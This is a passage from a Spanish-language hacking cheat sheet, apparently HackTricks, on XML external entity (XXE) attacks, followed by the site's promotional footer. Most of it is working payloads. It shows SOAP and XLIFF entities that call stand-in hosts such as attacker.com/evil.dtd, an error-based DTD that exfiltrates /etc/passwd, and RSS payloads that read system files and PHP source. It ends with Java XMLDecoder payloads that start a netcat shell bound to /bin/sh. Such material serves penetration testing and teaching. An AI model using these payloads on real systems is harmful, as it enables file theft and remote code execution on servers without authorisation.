</creds>
```
## **SOAP - XEE**
```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Este ejemplo está inspirado en [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) se utiliza para estandarizar el intercambio de datos en procesos de localización. Es un formato basado en XML utilizado principalmente para transferir datos localizables entre herramientas durante la localización y como formato de intercambio común para herramientas de TAC (Traducción Asistida por Computadora).

### Análisis de Solicitudes a Ciegas

Se realiza una solicitud al servidor con el siguiente contenido:
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Sin embargo, esta solicitud desencadena un error interno del servidor, mencionando específicamente un problema con las declaraciones de marcado:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
A pesar del error, se registra un hit en Burp Collaborator, lo que indica cierto nivel de interacción con la entidad externa.

Exfiltración de Datos Fuera de Banda
Para exfiltrar datos, se envía una solicitud modificada:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Este enfoque revela que el User Agent indica el uso de Java 1.8. Una limitación destacada de esta versión de Java es la incapacidad de recuperar archivos que contienen un carácter de nueva línea, como /etc/passwd, utilizando la técnica Out of Band.

Exfiltración de Datos Basada en Errores
Para superar esta limitación, se emplea un enfoque basado en errores. El archivo DTD está estructurado de la siguiente manera para desencadenar un error que incluya datos de un archivo objetivo:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
El servidor responde con un error, reflejando de manera importante que el archivo no existe, lo que indica que el servidor está intentando acceder al archivo especificado:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Para incluir el contenido del archivo en el mensaje de error, se ajusta el archivo DTD:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Esta modificación conduce a la exitosa exfiltración del contenido del archivo, tal como se refleja en la salida de error enviada a través de HTTP. Esto indica un exitoso ataque XXE (Entidad Externa XML), aprovechando tanto técnicas Out of Band como Error-Based para extraer información sensible.


## RSS - XEE

XML válido con formato RSS para explotar una vulnerabilidad XXE.

### Ping back

Solicitud HTTP simple al servidor del atacante
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Leer archivo

Un atacante puede utilizar una entidad externa XML (XXE) para leer archivos del sistema de archivos del servidor. El siguiente ejemplo muestra cómo se puede realizar esto utilizando una entidad externa general y una entidad externa específica de documento (XEE):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

En este ejemplo, el atacante está intentando leer el archivo `/etc/passwd` del sistema de archivos del servidor.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Leer código fuente

Usando el filtro base64 de PHP
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder es una clase de Java que crea objetos basados en un mensaje XML. Si un usuario malintencionado puede hacer que una aplicación utilice datos arbitrarios en una llamada al método **readObject**, obtendrá instantáneamente la ejecución de código en el servidor.

### Usando Runtime().exec()
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

El `ProcessBuilder` es una clase en Java que se utiliza para crear procesos nativos del sistema operativo. Permite a los desarrolladores ejecutar comandos en el sistema operativo subyacente desde una aplicación Java.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Herramientas

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Más recursos

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
Extraer información a través de HTTP utilizando su propio DTD externo: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
